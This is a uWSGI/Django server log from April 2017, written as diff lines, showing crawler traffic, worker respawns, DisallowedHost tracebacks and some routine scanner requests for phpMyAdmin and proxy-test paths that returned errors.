+[pid: 9912|app: 0|req: 17/128] 183.129.160.229 () {42 vars in 799 bytes} [Mon Apr  3 11:45:19 2017] POST /onvif/device_service => generated 2850 bytes in 33 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '45.32.253.201.vultr.com'. You may need to add '45.32.253.201.vultr.com' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '45.32.253.201.vultr.com'. You may need to add '45.32.253.201.vultr.com' to ALLOWED_HOSTS.
+[pid: 7089|app: 0|req: 14/129] 169.54.244.75 () {28 vars in 317 bytes} [Mon Apr  3 13:14:24 2017] GET / => generated 0 bytes in 245 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 7089|app: 0|req: 15/130] 42.236.99.178 () {42 vars in 577 bytes} [Mon Apr  3 13:19:22 2017] GET /blog => generated 15438 bytes in 567 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7082|app: 0|req: 12/131] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 13:31:55 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 11353|app: 0|req: 16/132] 40.77.167.96 () {42 vars in 570 bytes} [Mon Apr  3 14:47:04 2017] GET / => generated 2572 bytes in 180 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 17/133] 220.181.51.87 () {38 vars in 503 bytes} [Mon Apr  3 15:52:41 2017] GET / => generated 2572 bytes in 57 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7089|app: 0|req: 16/134] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 16:46:13 2017] GET / => generated 2572 bytes in 40 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7082|app: 0|req: 13/135] 123.125.71.55 () {40 vars in 544 bytes} [Mon Apr  3 16:46:29 2017] GET / => generated 2572 bytes in 63 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+Mon Apr  3 17:55:53 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 185.169.230.8) !!!
+Mon Apr  3 17:55:53 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET / (185.169.230.8)
+OSError: write error
+[pid: 11990|app: 0|req: 10/136] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 17:55:30 2017] GET / => generated 0 bytes in 22216 msecs (HTTP/1.0 200) 2 headers in 0 bytes (0 switches on core 0)
+DAMN ! worker 6 (pid: 7089) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 6 (new pid: 14228)
+[pid: 9912|app: 0|req: 18/137] 123.151.12.152 () {40 vars in 695 bytes} [Mon Apr  3 18:09:30 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 18/138] 221.204.87.163 () {42 vars in 984 bytes} [Mon Apr  3 18:10:01 2017] GET /?from=singlemessage => generated 2572 bytes in 46 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14228|app: 0|req: 17/139] 221.204.87.163 () {38 vars in 690 bytes} [Mon Apr  3 18:10:28 2017] GET /?from=singlemessage => generated 2572 bytes in 149 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 10870|app: 0|req: 13/140] 221.204.87.163 () {42 vars in 847 bytes} [Mon Apr  3 18:10:29 2017] GET /favicon.ico => generated 2819 bytes in 52 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 11353|app: 0|req: 17/141] 221.204.87.163 () {42 vars in 827 bytes} [Mon Apr  3 18:10:35 2017] GET / => generated 2572 bytes in 66 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 11990|app: 0|req: 11/142] 221.204.87.163 () {42 vars in 828 bytes} [Mon Apr  3 18:10:35 2017] GET /favicon.ico => generated 2819 bytes in 45 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 11990|app: 0|req: 12/143] 221.204.87.163 () {42 vars in 836 bytes} [Mon Apr  3 18:10:40 2017] GET /favicon.ico => generated 2819 bytes in 30 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+DAMN ! worker 9 (pid: 11353) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 9 (new pid: 14256)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+[pid: 7082|app: 0|req: 14/144] 91.196.50.33 () {38 vars in 619 bytes} [Mon Apr  3 18:53:48 2017] GET /testproxy.php => generated 0 bytes in 308 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 7082|app: 0|req: 15/145] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 19:48:51 2017] GET / => generated 2572 bytes in 42 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 5 (pid: 12685) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 5 (new pid: 14868)
+DAMN ! worker 10 (pid: 7082) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 10 (new pid: 14870)
+[pid: 10870|app: 0|req: 14/146] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 21:11:29 2017] GET / => generated 2572 bytes in 43 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14870|app: 0|req: 16/147] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 22:42:03 2017] GET / => generated 2572 bytes in 132 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14228|app: 0|req: 18/148] 185.169.230.8 () {28 vars in 305 bytes} [Mon Apr  3 23:59:42 2017] GET / => generated 2572 bytes in 44 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14870|app: 0|req: 17/149] 182.118.54.60 () {38 vars in 644 bytes} [Tue Apr  4 00:08:44 2017] GET /5/ => generated 6732 bytes in 407 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 11990|app: 0|req: 13/150] 42.156.254.47 () {38 vars in 539 bytes} [Tue Apr  4 00:20:13 2017] GET / => generated 2572 bytes in 47 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14870|app: 0|req: 18/151] 42.156.254.46 () {34 vars in 515 bytes} [Tue Apr  4 00:20:21 2017] GET / => generated 2572 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 19/152] 220.181.108.96 () {40 vars in 545 bytes} [Tue Apr  4 00:42:28 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 19/153] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 01:17:33 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 20/154] 111.206.36.137 () {32 vars in 471 bytes} [Tue Apr  4 01:21:42 2017] GET / => generated 2572 bytes in 45 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 21/155] 35.162.141.144 () {36 vars in 424 bytes} [Tue Apr  4 02:45:19 2017] GET / => generated 2572 bytes in 47 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 22/156] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 02:59:40 2017] GET / => generated 2572 bytes in 57 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 11990|app: 0|req: 14/157] 220.181.51.91 () {38 vars in 560 bytes} [Tue Apr  4 03:34:00 2017] GET /robots.txt => generated 2816 bytes in 40 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 11990|app: 0|req: 15/158] 180.149.130.18 () {38 vars in 623 bytes} [Tue Apr  4 03:46:14 2017] GET / => generated 2572 bytes in 48 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 20/159] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 04:29:14 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 12470|app: 0|req: 18/160] 191.96.249.97 () {28 vars in 361 bytes} [Tue Apr  4 04:55:21 2017] GET /phpmyadmin/scripts/setup.php => generated 2870 bytes in 131 msecs (HTTP/1.0 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 7084|app: 0|req: 21/161] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 05:43:33 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.0 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 7084|app: 0|req: 22/162] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 07:19:39 2017] GET / => generated 2572 bytes in 45 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+[pid: 14228|app: 0|req: 19/163] 91.196.50.33 () {38 vars in 619 bytes} [Tue Apr  4 08:05:00 2017] GET /testproxy.php => generated 0 bytes in 329 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 9035|app: 0|req: 16/164] 220.181.108.149 () {40 vars in 546 bytes} [Tue Apr  4 08:40:04 2017] GET / => generated 2572 bytes in 51 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+DAMN ! worker 10 (pid: 14870) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 10 (new pid: 17974)
+DAMN ! worker 8 (pid: 7084) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 8 (new pid: 17978)
+[pid: 9912|app: 0|req: 23/165] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 08:57:48 2017] GET / => generated 2572 bytes in 49 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 23/166] 213.136.89.100 () {40 vars in 636 bytes} [Tue Apr  4 08:58:29 2017] GET /index.php => generated 2813 bytes in 78 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 14228|app: 0|req: 20/167] 79.172.193.32 () {34 vars in 483 bytes} [Tue Apr  4 11:11:18 2017] GET / => generated 2572 bytes in 50 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 24/168] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 11:43:50 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 10870|app: 0|req: 15/169] 207.46.13.243 () {40 vars in 553 bytes} [Tue Apr  4 11:53:53 2017] GET /robots.txt => generated 2816 bytes in 46 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 14228|app: 0|req: 21/170] 35.162.141.144 () {36 vars in 424 bytes} [Tue Apr  4 12:12:27 2017] GET / => generated 2572 bytes in 60 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 17/171] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 13:11:38 2017] GET / => generated 2572 bytes in 53 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 24/172] 66.102.9.129 () {38 vars in 627 bytes} [Tue Apr  4 14:17:13 2017] GET / => generated 2572 bytes in 63 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 19/173] 66.102.9.159 () {38 vars in 593 bytes} [Tue Apr  4 14:17:14 2017] GET /favicon.ico => generated 2819 bytes in 85 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 18/174] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 14:41:15 2017] GET / => generated 2572 bytes in 47 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.xyc55.com'. You may need to add 'www.xyc55.com' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.xyc55.com'. You may need to add 'www.xyc55.com' to ALLOWED_HOSTS.
+[pid: 12470|app: 0|req: 19/175] 23.247.27.67 () {32 vars in 494 bytes} [Tue Apr  4 15:04:14 2017] GET / => generated 0 bytes in 266 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+[pid: 12470|app: 0|req: 20/176] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 16:11:57 2017] GET / => generated 2572 bytes in 74 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 19/177] 220.181.108.175 () {40 vars in 546 bytes} [Tue Apr  4 17:09:03 2017] GET / => generated 2572 bytes in 54 msecs (HTTP/1.1 200) 2 headers in 88 bytes (2 switches on core 0)
+[pid: 9912|app: 0|req: 25/178] 185.169.230.8 () {28 vars in 305 bytes} [Tue Apr  4 17:40:44 2017] GET / => generated 2572 bytes in 43 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+[pid: 14256|app: 0|req: 19/179] 58.225.75.151 () {36 vars in 439 bytes} [Tue Apr  4 18:19:19 2017] GET /muieblackcat => generated 2822 bytes in 127 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 10870|app: 0|req: 16/180] 58.225.75.151 () {36 vars in 472 bytes} [Tue Apr  4 18:19:19 2017] GET //phpMyAdmin/scripts/setup.php => generated 2870 bytes in 49 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 17978|app: 0|req: 25/181] 58.225.75.151 () {36 vars in 472 bytes} [Tue Apr  4 18:19:20 2017] GET //phpmyadmin/scripts/setup.php => generated 2870 bytes in 24 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 17974|app: 0|req: 20/182] 58.225.75.151 () {36 vars in 458 bytes} [Tue Apr  4 18:19:20 2017] GET //pma/scripts/setup.php => generated 2849 bytes in 30 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9035|app: 0|req: 20/183] 58.225.75.151 () {36 vars in 466 bytes} [Tue Apr  4 18:19:20 2017] GET //myadmin/scripts/setup.php => generated 2861 bytes in 43 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 9912|app: 0|req: 26/184] 58.225.75.151 () {36 vars in 466 bytes} [Tue Apr  4 18:19:20 2017] GET //MyAdmin/scripts/setup.php => generated 2861 bytes in 52 msecs (HTTP/1.1 404) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 11990|app: 0|req: 16/185] 207.46.13.174 () {42 vars in 571 bytes} [Tue Apr  4 18:50:33 2017] GET / => generated 2572 bytes in 56 msecs (HTTP/1.1 200) 2 headers in 88 bytes (1 switches on core 0)
+Tue Apr  4 18:53:54 2017 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 116.103.151.165) !!!
+Tue Apr  4 18:53:54 2017 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 296] during GET / (116.103.151.165)
+DAMN ! worker 4 (pid: 11990) died, killed by signal 9 :( trying respawn ...
+Respawned uWSGI worker 4 (new pid: 21186)
+OSError: write error
+[pid: 14868|app: 0|req: 19/186] 116.103.151.165 () {26 vars in 282 bytes} [Tue Apr  4 18:53:38 2017] GET / => generated 0 bytes in 17200 msecs (HTTP/1.0 200) 2 headers in 0 bytes (0 switches on core 0)
+[pid: 10870|app: 0|req: 17/187] 217.249.105.86 () {26 vars in 281 bytes} [Tue Apr  4 19:09:35 2017] GET / => generated 2572 bytes in 52 msecs (HTTP/1.0 200) 2 headers in 88 bytes (1 switches on core 0)
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 108, in get_response
+    response = middleware_method(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/middleware/common.py", line 62, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/wsgi.py", line 189, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.5/dist-packages/django/core/handlers/base.py", line 207, in get_response
+    return debug.technical_500_response(request, *sys.exc_info(), status_code=400)
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 97, in technical_500_response
+    html = reporter.get_traceback_html()
+  File "/usr/local/lib/python3.5/dist-packages/django/views/debug.py", line 384, in get_traceback_html
+    return t.render(c)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 210, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 202, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/defaulttags.py", line 329, in render
+    return nodelist.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 905, in render
+    bit = self.render_node(node, context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 79, in render_node
+    return node.render(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/debug.py", line 89, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 648, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 789, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.5/dist-packages/django/template/base.py", line 849, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 152, in build_absolute_uri
+    host=self.get_host(),
+  File "/usr/local/lib/python3.5/dist-packages/django/http/request.py", line 102, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'testp3.pospr.waw.pl'. You may need to add 'testp3.pospr.waw.pl' to ALLOWED_HOSTS.
+[pid: 9035|app: 0|req: 21/188] 91.196.50.33 () {38 vars in 619 bytes} [Tue Apr  4 19:27:34 2017] GET /testproxy.php => generated 0 bytes in 1737 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
